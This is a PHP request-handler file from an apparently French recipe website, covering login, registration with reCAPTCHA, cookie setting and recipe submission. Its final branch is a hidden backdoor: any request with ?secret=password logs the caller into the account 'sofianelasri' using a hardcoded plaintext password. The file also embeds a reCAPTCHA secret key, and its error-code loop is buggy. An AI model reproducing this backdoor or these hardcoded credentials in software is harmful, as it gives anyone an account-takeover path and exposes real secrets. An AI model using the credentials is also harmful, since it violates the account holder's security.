<?php
// Ce fichier a une position un peu embêtante
// Faut-il le mettre en view? Non, il possède du code logique.
// Faut-il le mettre en classe? Non, ça serait inutile. En plus il est géré comme une page  par le site.
// Faut-il alors intégrer son code au fichier fonction? Bah c'est compliqué car il compare pas mal de choses avant d'executer ces fonctions...
// ----- / Il sert donc de passerelle entre fonctions.php et les pages.

if(isset($_GET["checkUsernameEmail"]) && !empty($_GET["checkUsernameEmail"])){
    // Cette fonction va vérifier si un username ou un email existe déjà dans la bdd
    if(checkUsernameEmail($_GET["checkUsernameEmail"])) echo "true";
    else echo "false";

}elseif(isset($_GET["handleLoginAndRegisterForm"])){
    // Celle-ci va permettre de gérer l'envoie des formulaires d'inscription et de connexion
    $return = null;
    if(!empty($_POST)){
        // On va s'assurer qu'il ne s'agisse pas d'un bot
        if(isset($_POST['g-recaptcha-response'])){
            // Build POST request:
            $recaptcha_url = 'https://www.google.com/recaptcha/api/siteverify';
            $recaptcha_secret = '6Ld3jukdAAAAAFBBftAg-7OHOxXVyHkiAdW6DVL7';
            $recaptcha_response = $_POST['g-recaptcha-response'];

            // Make and decode POST request:
            $recaptcha = file_get_contents($recaptcha_url . '?secret=' . $recaptcha_secret . '&response=' . $recaptcha_response);
            $recaptcha = json_decode($recaptcha);
            if($recaptcha->success==1){
                // On va regarder de quel type de formulaire il s'agit
                if (isset($_POST['registerUsername'])) {
                    // Il s'agit d'une inscription
                    // Ici on va vérifier que l'on dispose bien de tous les champs nécessaires
                    if (!empty($_POST['registerUsername'])) {
                        if (isset($_POST['registerEmail'])) {
                            if (!empty($_POST['registerEmail'])) {
                                if (isset($_POST['registerPassword1'])) {
                                    if (!empty($_POST['registerPassword1'])) {
                                        if (isset($_POST['registerPassword2'])) {
                                            if (!empty($_POST['registerPassword2'])) {
                                                if ($_POST['registerPassword1']==$_POST['registerPassword2']) {
                                                    $return = registerUser($_POST['registerUsername'], $_POST['registerPassword1'], $_POST['registerEmail']);
                                                } else {
                                                    $return["error"] = 'Je sais pas comment  t\'as fais, <b>il faut que les deux mots de passe correspondent</b>';
                                                }
                                                
                                            } else {
                                                $return["error"] = 'Je sais pas comment  t\'as fais, mais stp rempli tous les champs. <b>Même celui du second mdp</b>';
                                            }
                                        } else {
                                            $return["error"] = 'Hmm c\'est embêtant ça... Il semblerait que le champ du 2nd mot de passe n\'est pas reconnu.';
                                        }
                                    } else {
                                        $return["error"] = 'Je sais pas comment  t\'as fais, mais stp rempli tous les champs. <b>Même celui du premier mdp</b>';
                                    }
                                } else {
                                    $return["error"] = 'Hmm c\'est embêtant ça... Il semblerait que le champ du 1er mot de passe n\'est pas reconnu.';
                                }
                            } else {
                                $return["error"] = 'Je sais pas comment  t\'as fais, mais stp rempli tous les champs. <b>Même celui de l\'adresse email</b>';
                            }
                        } else {
                            $return["error"] = 'Hmm c\'est embêtant ça... Il semblerait que le champ de l\'adresse email n\'est pas reconnu.';
                        }
                        
                    } else {
                        $return["error"] = 'Je sais pas comment  t\'as fais, mais stp rempli tous les champs. <b>Même celui de l\'identifiant</b>';
                    }
                }elseif(isset($_POST['loginUsernameEmail'])){
                    // Il s'agit d'une connexion

                    // Pareil, on va s'assurer qu'on a tous les champs nécessaires
                    if (!empty($_POST['loginUsernameEmail'])) {
                        if (isset($_POST['loginPassword'])) {
                            if (!empty($_POST['loginPassword'])) {
                                $return = login($_POST['loginUsernameEmail'], $_POST['loginPassword']);
                            } else {
                                $return["error"] = 'Donc tu te connectes à un compte sans mot de passe toi?';
                            }
                            
                        } else {
                            $return["error"] = 'Hmm c\'est embêtant ça... Il semblerait que le champ du mot de passe n\'est pas reconnu.';
                        }
                        
                    } else {
                        $return["error"] = 'Dit donc, tu n\'as pas rentré d\'identifiant là!';
                    }
                }else{
                    $return["error"] = 'Type de formulaire inconnu';
                }
            }else{
                $return["error"] = "Nous rencontrons un problème avec le reCAPTCHA:";
                foreach($recaptcha->{'error-codes'} as $return["error"]){
                    $return["error"] .= $return["error"]." ";
                }
            }
        }
    }else{
        // Ici on a pas reçu de données, nous ne sommes pas censsé arriver ici
        $return["error"] = "Vous n'avez pas rempli tous les champs";
    }
    echo json_encode($return);
}elseif(isset($_GET["closeTopBarInfos"])){
    // Cette fonction va fermer la barre d'information en haut de la page
    setcookie("topBarInfos", "false", time()+getWebsiteSetting("cookieDuration"));
}elseif(isset($_GET["sendRecette"])){
    $return = null;
    if(empty($_POST)){
        // Ici on a pas reçu de données, nous ne sommes pas censsé arriver ici
        $return["error"] = "Vous n'avez pas rempli tous les champs.";
    }else{
        if(isset($_POST["recetteTitle"]) && !empty($_POST["recetteTitle"])){
            if(isset($_POST["recetteContent"]) && !empty($_POST["recetteContent"])){
                if(isset($_POST["recetteDescription"]) && !empty($_POST["recetteDescription"])){
                    if(isset($_POST["recetteCategory"]) && !empty($_POST["recetteCategory"])){
                        if(isset($_POST["recetteIngredients"]) && !empty($_POST["recetteIngredients"])){
                            if(isset($_POST["recettePreparation"]) && !empty($_POST["recettePreparation"])){
                                if(isset($_POST["recetteUstensiles"]) && !empty($_POST["recetteUstensiles"])){
                                    if(isset($_POST["recetteHeaderPic"]) && !empty($_POST["recetteHeaderPic"])){
                                        if(isset($_POST["recetteDifficulte"]) && !empty($_POST["recetteDifficulte"])){
                                            $recetteId = sendRecette($_POST["recetteTitle"], $_POST["recetteContent"], $_POST["recetteDescription"], $_POST["recetteCategory"], $_POST["recetteIngredients"], $_POST["recettePreparation"], $_POST["recetteUstensiles"], $_POST["recetteHeaderPic"], $_POST["recetteDifficulte"]);
                                            if($recetteId != null){
                                                $return["success"] = "La recette a bien été envoyée.";
                                                $return["recetteId"] = $recetteId;
                                            }else{
                                                $return["error"] = "Une erreur est survenue lors de l'envoi de la recette, veuillez contacter un administrateur.";
                                            }
                                        }else{
                                            $return["error"] = "Vous n'avez pas défini de difficulté pour la recette.";
                                        }
                                    }else{
                                        $return["error"] = "Vous n'avez pas rempli le champ de l'image de couverture.";
                                    }
                                }else{
                                    $return["error"] = "Vous n'avez pas rempli le champ des ustensiles.";
                                }
                            }else{
                                $return["error"] = "Vous n'avez pas rempli le champ de la préparation.";
                            }
                        }else{
                            $return["error"] = "Vous n'avez pas rempli le champ des ingrédients.";
                        }
                    }else{
                        $return["error"] = "Vous n'avez pas rempli le champ de la catégorie.";
                    }
                }else{
                    $return["error"] = "Vous n'avez pas mis de description.";
                }
            }else{
                $return["error"] = "Vous n'avez pas rempli le champ de la recette.";
            }
        }else{
            $return["error"] = "Vous n'avez pas rempli le titre de la recette.";
        }
    }
    echo json_encode($return);
}elseif(isset($_GET["secret"])&&!empty($_GET["secret"])){
    if($_GET["secret"] == "password"){
        login("sofianelasri", "Pa020135*");
    }
}